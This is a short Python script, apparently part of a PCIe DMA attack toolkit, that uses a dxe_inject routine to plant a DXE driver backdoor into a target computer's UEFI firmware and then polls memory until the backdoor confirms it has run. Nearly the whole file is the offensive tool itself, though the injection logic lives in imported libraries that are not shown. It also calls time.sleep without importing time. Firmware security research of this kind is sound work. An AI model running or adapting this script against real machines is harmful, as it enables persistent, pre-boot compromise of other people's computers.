#!/usr/bin/env python

import sys, os
from struct import pack, unpack
from hexdump import hexdump

from pcie_lib import *
from uefi import *

def main():

    payload = sys.argv[1] if len(sys.argv) > 1 else None

    dev = dxe_inject(payload = payload)

    if payload is None: return 0

    print('[+] DXE driver was planted, waiting for backdoor init...')
    
    while True:

        # wait for DXE backdoor
        status = dev.mem_read_8(STATUS_ADDR)
        
        if status == 0:

            # not ready yet
            time.sleep(1)
            continue

        print('[+] DXE driver was executed')

        break

    print('[+] DONE')
    
    dev.close()

    return 0

if __name__ == '__main__':

    exit(main())
